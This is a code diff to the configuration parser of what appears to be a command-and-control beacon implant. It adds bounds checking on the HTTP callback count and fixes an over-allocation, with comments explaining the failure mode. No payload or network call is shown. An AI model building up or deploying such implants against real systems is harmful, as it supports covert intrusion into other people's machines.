@@ -69,14 +69,29 @@ auto DECLFN GetConfig( KHARON_CONFIG* Cfg ) -> VOID {
     HttpParser->Length   = sizeof( HttpConfig );
 
     INT32 CallbackCount      = Self->Psr->Int32( HttpParser );
-    Cfg->Http.CallbacksCount = CallbackCount;
+
+    // CallbackCount comes straight out of the compiled-in blob with no check
+    // behind it, and everything below multiplies by it.  A blob that did not
+    // compile in as intended -- the macro is empty, or was quoted into a string
+    // literal -- yields the leading characters read as an integer, which is
+    // ~2e9.  CallbackCount * sizeof( HTTP_CALLBACKS ) is then gigabytes, and
+    // the beacon spends forever inside RtlAllocateHeap's zeroing instead of
+    // failing fast.  Nothing legitimate needs more than a handful.
+    if ( CallbackCount < 1 || CallbackCount > 16 ) {
+        CallbackCount = 0;
+    }
+    Cfg->Http.CallbacksCount = (ULONG)CallbackCount;
 
     KhDbg( "[*] HTTP Malleable: CallbackCount = %d", CallbackCount );
 
     Cfg->Http.Callbacks = (HTTP_CALLBACKS**)KhAlloc( CallbackCount * sizeof( PVOID ) );
 
     for ( int i = 0; i < CallbackCount; i++ ) {
-        Cfg->Http.Callbacks[i] = (HTTP_CALLBACKS*)KhAlloc( CallbackCount * sizeof( HTTP_CALLBACKS ) );
+        // One HTTP_CALLBACKS per callback.  This used to be multiplied by
+        // CallbackCount as well, which is a quiet over-allocation for the
+        // one-or-two callbacks a real profile has and a quadratic blow-up when
+        // the count is garbage.
+        Cfg->Http.Callbacks[i] = (HTTP_CALLBACKS*)KhAlloc( sizeof( HTTP_CALLBACKS ) );
     }
 
     for ( int i = 0; i < Cfg->Http.CallbacksCount; i++ ) {
